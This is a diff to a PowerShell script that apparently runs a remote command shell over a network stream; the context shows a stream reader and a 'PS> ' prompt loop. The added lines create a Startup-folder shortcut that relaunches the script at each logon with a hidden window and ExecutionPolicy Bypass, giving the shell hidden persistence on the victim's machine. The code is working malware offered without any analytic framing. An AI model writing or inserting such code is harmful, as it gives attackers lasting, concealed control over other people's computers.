@@ -10,6 +10,32 @@ $reader = New-Object System.IO.StreamReader($stream)
 $buffer = New-Object byte[] 1024
 $encoding = New-Object System.Text.ASCIIEncoding
 
+# Get the path of the Startup folder for the current user
+$StartupFolder = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup')
+
+# Get the full path of the script file
+$ScriptPath = $MyInvocation.MyCommand.Path
+
+# Define the path for the shortcut
+$ShortcutPath = [System.IO.Path]::Combine($StartupFolder, 'MyScript.lnk')
+
+# Check if the shortcut already exists
+if (Test-Path $ShortcutPath) {
+    Write-Host "Shortcut already exists: $ShortcutPath"
+} else {
+    # Create a WScript.Shell COM object
+    $WScriptShell = New-Object -ComObject WScript.Shell
+
+    # Create the shortcut
+    $Shortcut = $WScriptShell.CreateShortcut($ShortcutPath)
+    $Shortcut.TargetPath = 'powershell.exe'
+    $Shortcut.Arguments = "-WindowStyle hidden -ExecutionPolicy Bypass -File `"$ScriptPath`""
+    $Shortcut.WorkingDirectory = [System.IO.Path]::GetDirectoryName($ScriptPath)
+    $Shortcut.Save()
+
+    Write-Host "Shortcut created in Startup folder: $ShortcutPath"
+}
+
 while ($true) {
     $writer.Write("PS> ")
     $writer.Flush()
